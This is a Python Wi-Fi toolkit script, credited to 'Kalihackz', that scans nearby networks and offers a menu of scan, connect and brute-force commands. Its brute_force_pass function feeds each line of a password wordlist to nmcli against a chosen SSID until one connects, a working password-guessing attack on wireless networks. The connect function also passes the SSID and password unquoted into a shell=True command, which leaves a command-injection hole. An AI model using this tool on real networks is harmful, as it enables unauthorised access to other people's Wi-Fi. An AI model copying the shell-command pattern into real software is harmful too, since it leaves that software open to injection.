from wifi import Cell, Scheme
import texttable as tt
from termcolor import cprint 
import time

class WifiTool:

    def __init__(self, interface):
        cprint(''' __          ___  __ _    _______          _ 
 \ \        / (_)/ _(_)  |__   __|        | |
  \ \  /\  / / _| |_ _      | | ___   ___ | |
   \ \/  \/ / | |  _| |     | |/ _ \ / _ \| |
    \  /\  /  | | | | |     | | (_) | (_) | |
     \/  \/   |_|_| |_|     |_|\___/ \___/|_|
                                               ''', "red")
        cprint("                        - A Wifi Toolkit for all\n", "magenta")
        cprint("                                 Version : MacOS\n", "red") 
        cprint("                                    By Kalihackz\n", "cyan")                                              
        cprint("Starting the WifiTool . . . \n", "green")
        self.interface = interface
        time.sleep(2)

    def scanWifi(self):
        import platform
        import subprocess
        import re
        
        tab = tt.Texttable()
        headings = ['SSID', 'SIGNAL', 'FREQUENCY', 'CHANNEL', ' MAC ADDRESS ', 'ENCRYPTION']
        tab.header(headings)
        
        ssid = []
        signl = []
        freq = []
        chnl = []
        addr = []
        encry = []
        connection = 0
        
        cprint("\n[*] Scanning for WiFi connections . . . \n", "yellow")
        
        try:
            if platform.system() == "Darwin":
                cmd = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s"
                out = subprocess.check_output(cmd, shell=True, text=True)
                lines = out.strip().splitlines()
                
                # skip header
                for line in lines[1:]:
                    m = re.match(r'(.+?)\s+([0-9A-Fa-f:]{17})\s+(-?\d+)\s+(\d+)\s+\S+\s+\S+\s+(.+)', line)
                    if not m:
                        continue
                    s, mac, rssi, channel, security = m.groups()
                    connection += 1
                    ssid.append(s.strip())
                    signl.append(f"{rssi} dB")
                    freq.append("")  # airport doesn't show frequency directly
                    chnl.append(channel)
                    addr.append(mac)
                    encry.append(security.strip().upper() if security.strip() else "OPEN")
            else:
                # Linux (uses python-wifi which requires iwlist)
                for cell in Cell.all(self.interface):
                    connection += 1
                    ssid.append(cell.ssid)
                    signl.append(str(cell.signal) + " dB")
                    freq.append(cell.frequency)
                    chnl.append(cell.channel)
                    addr.append(cell.address)
                    encryp = cell.encryption_type if cell.encrypted == True else "open"
                    encry.append(encryp.upper())

            for row in zip(ssid, signl, freq, chnl, addr, encry):
                tab.add_row(row)
            
            s = tab.draw()
            cprint(s, "green")
            
            if connection == 0:
                cprint("\n[-] No WiFi connection in your area\n", 'red')
                return
            
            cprint("\n[+] " + str(connection) + " WiFi connection/s found\n", 'cyan')
            
        except FileNotFoundError as fnf:
            cprint(str(fnf), "yellow")
            cprint("[!!] Required system tool not found (iwlist/airport). Install wireless tools on Linux or run on macOS with airport available.\n", "yellow")
        except Exception as e:
            cprint(str(e), "yellow")
            cprint("[!!] Something went wrong\n", "yellow")

    def connect_wifi(self, ssid, passkey):
        try:
            import subprocess
            output = subprocess.check_output(f"nmcli dev wifi connect {ssid} password {passkey}", shell=True)
            if "Device 'wlan0' successfully activated" in str(output):
                cprint(f"[+] WiFi '{ssid}' successfully connected with '{passkey}'\n", "green")
                return True
            else:
                cprint(f"[-] Wrong password\n", "red")
                time.sleep(7)
                return False
        except Exception as e:
            cprint("[!!] Connection Failed\n", "yellow")
            return False

    def brute_force_pass(self, ssid, wordlist):
        with open(wordlist, 'rt') as file:
            for line in file.readlines():
                password = line.strip()
                if (self.connect_wifi(ssid, password)):
                    break
    
    @staticmethod
    def menu():
        cprint("----------------------------Menu---------------------------", "yellow")
        cprint(" | * scan - scan wifi connections", 'magenta', attrs=['bold'])
        cprint(" | * connect - connect to wifi connection", 'magenta', attrs=['bold'])
        cprint(" | * bruteforce - brute force wifi connection", 'magenta', attrs=['bold'])
        cprint(" | * exit - exit", 'magenta', attrs=['bold'])
        cprint("_|_________________________________________________________\n", "yellow")


if __name__ == "__main__":
    try:
        wifi = WifiTool("wlan0")
        while(True):
            wifi.menu()
            cprint("\nroot@WifiScanner:~$ ", "green", end="")
            c = input()
            if c == "scan":
                wifi.scanWifi()
            elif c == "connect":
                cprint("\n[+] Enter SSID : ", "green", end="")
                ssid = input()
                cprint("[+] Enter PASSWORD : ", "green", end="")
                passkey = input()
                wifi.connect_wifi(ssid, passkey)
            elif c == "bruteforce":
                cprint("\n[+] Enter SSID : ", "green", end="")
                ssid = input()
                cprint("[+] Enter PASSWORD File path : ", "green", end="")
                wordlist = input()
                wifi.brute_force_pass(ssid, wordlist)
            elif c == "exit":
                cprint("\n[+] Exiting ...\n", 'red')
                exit()
    except KeyboardInterrupt:
        cprint("\n\n[-] Forced Exit By User!!!\n", "red")
